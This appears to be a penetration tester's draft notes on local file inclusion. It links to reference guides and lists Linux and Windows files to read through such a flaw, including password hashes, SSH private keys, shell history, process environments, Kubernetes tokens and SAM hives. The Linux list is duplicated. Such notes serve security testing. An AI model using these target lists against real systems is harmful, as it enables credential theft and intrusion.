- [`Inclusion Using Wrappers — PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md)


- [`Testing for File Inclusion — OWASP WSTG`](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion)
- [`PHP wrappers and streams — The Hacker Recipes`](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams)
- [`File Inclusion — yuyudhn's notes`](https://htb.linuxsec.org/web-application/file-inclusion)
# drafts
## Common files

Try accessing common files:

- Linux:

```
/etc/passwd  
/etc/shadow  
/etc/hosts  
/proc/self/environ  
/var/log/apache2/access.log
```

- Windows:

```
C:\Windows\System32\drivers\etc\hosts  
C:\Windows\win.ini  
C:\boot.ini  
C:\xampp\apache\logs\access.log
```



### Linux

```bash
# etc
/etc/issue  # contains a text message or system identification to be printed before the login prompt

# users and groups
/etc/passwd
/etc/shadow
/etc/gpasswd
/etc/gshadow

# shell configuration files
~/.bash_profile
~/.bash_login
~/.profile
~/.bashrc
/etc/bash.bashrc

# bash history
~/.bash_history

# SSH
~/.ssh/id_rsa

# database configuration
/etc/mysql/my.cnf

# processes
/proc/[0-9]*/fd/[0-9]*
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/index.php
/proc/self/cwd/main.py

# kubernetes
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount

# databases
/var/lib/mlocate/mlocate.db
/var/lib/plocate/plocate.db
/var/lib/mlocate.db
```



```
# etc
/etc/issue  # contains a text message or system identification to be printed before the login prompt

# users and groups
/etc/passwd
/etc/shadow
/etc/gpasswd
/etc/gshadow

# shell configuration files
~/.bash_profile
~/.bash_login
~/.profile
~/.bashrc
/etc/bash.bashrc

# bash history
~/.bash_history

# SSH
~/.ssh/id_rsa

# database configuration
/etc/mysql/my.cnf

# processes
/proc/[0-9]*/fd/[0-9]*
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/index.php
/proc/self/cwd/main.py

# kubernetes
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount

# databases
/var/lib/mlocate/mlocate.db
/var/lib/plocate/plocate.db
/var/lib/mlocate.db
```

[`LFI-files`](https://raw.githubusercontent.com/hussein98d/LFI-files/master/list.txt)



### Interesting Windows files

```
C:/boot.ini
C:/inetpub/logs/logfiles
C:/inetpub/wwwroot/global.asa
C:/inetpub/wwwroot/index.asp
C:/inetpub/wwwroot/web.config
C:/sysprep.inf
C:/sysprep.xml
C:/sysprep/sysprep.inf
C:/sysprep/sysprep.xml
C:/system32/inetsrv/metabase.xml
C:/sysprep.inf
C:/sysprep.xml
C:/sysprep/sysprep.inf
C:/sysprep/sysprep.xml
C:/system volume information/wpsettings.dat
C:/system32/inetsrv/metabase.xml
C:/unattend.txt
C:/unattend.xml
C:/unattended.txt
C:/unattended.xml
C:/windows/repair/sam
C:/windows/repair/system
```


[`Windows-files.txt`](https://raw.githubusercontent.com/soffensive/windowsblindread/master/windows-files.txt)



